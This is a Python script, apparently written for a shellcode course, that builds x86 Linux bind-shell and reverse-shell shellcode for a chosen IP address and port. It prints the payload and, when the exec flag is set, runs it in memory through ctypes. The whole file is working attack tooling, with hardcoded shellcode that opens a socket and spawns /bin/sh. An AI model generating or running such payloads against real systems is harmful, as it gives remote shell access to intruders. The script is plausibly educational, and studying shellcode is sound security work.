#!/usr/bin/python3

# Demey Alexandre
# 2020-05-01
# PA-14186

from ctypes import CDLL, CFUNCTYPE, c_char_p, cast
from sys import argv
import argparse
from ipaddress import ip_address, AddressValueError

#Default port
port = 1337
#Default ip address
ip = "127.0.0.1"


# Setting the arguments
parser = argparse.ArgumentParser()
parser.add_argument("-e", "--exec",
                    help="If set, the shellcode is printed to the screen then executed",
                    action="store_true")
parser.add_argument("-i", "--ip",
                    help="Change the ip address (Default:127.0.0.1) --ignored if bind type--")
parser.add_argument("-p", "--port", type=int,
                    help="Change the port (Default:1337)")
parser.add_argument("type", choices=["bind_tcp","reverse_tcp"],
                    help="Type of the shellcode")
args = parser.parse_args()

# Available shellcodes
shellcodes = { 
              'bind_tcp': "\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\x04\\x66\\xcd\\x80"\
                          "\\x97\\x5b\\x52\\x66\\x68{}\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89"\
                          "\\xe1\\x6a\\x66\\x58\\xcd\\x80\\x52\\x57\\x89\\xe1\\xd1\\xe3\\xb0\\x66\\xcd"\
                          "\\x80\\x52\\x52\\x57\\x89\\xe1\\x43\\xb0\\x66\\xcd\\x80\\x93\\x6a\\x03\\x59"\
                          "\\x49\\xb0\\x3f\\xcd\\x80\\x75\\xf9\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f"\
                          "\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80",

              'reverse_tcp': "\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\x04\\x66\\xcd"\
                             "\\x80\\x97\\x5b\\x68{}\\x66\\x68{}\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51"\
                             "\\x57\\x89\\xe1\\x43\\x6a\\x66\\x58\\xcd\\x80\\x87\\xcb\\x87\\xdf\\x49"\
                             "\\xb0\\x3f\\xcd\\x80\\x75\\xf9\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f"\
                             "\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80"}

# Change ip address if the ip argument is set
if args.ip:
    ip = args.ip

#Format the ip address
try:
    ip = "{0:0{1}x}".format(int(ip_address(ip)), 8)
    ip = "\\x" + ip[:2] + "\\x" + ip[2:4] + "\\x" + ip[4:6] + "\\x" + ip[6:] 
except AddressValueError:
    print("Invalid IP address")

# Change port number if the port argument is set and valid
if args.port and args.port > 0 and args.port <= 65535:
    port = args.port

# Format the port 
port = "{0:0{1}x}".format(port,4)
port = "\\x" + port[:2] + "\\x" + port[2:]

# Set ip / port where necessary
shellcode_str = ""
if args.type == "bind_tcp":
    shellcode_str = shellcodes[args.type].format(port)
elif args.type == "reverse_tcp":
    shellcode_str = shellcodes[args.type].format(ip,port)

# Print the shellcode and his size
shellcode_bytes = bytes.fromhex(shellcode_str.replace('\\x',''))
print("Shellcode size : {}".format(len(shellcode_bytes)))
print('"{}"'.format(shellcode_str))

# If arg exec is set, execute the shellcode
if args.exec :
    libc = CDLL("libc.so.6")

    c_shell_p = c_char_p(shellcode_bytes)

    launch = cast(c_shell_p, CFUNCTYPE(c_char_p))

    launch()
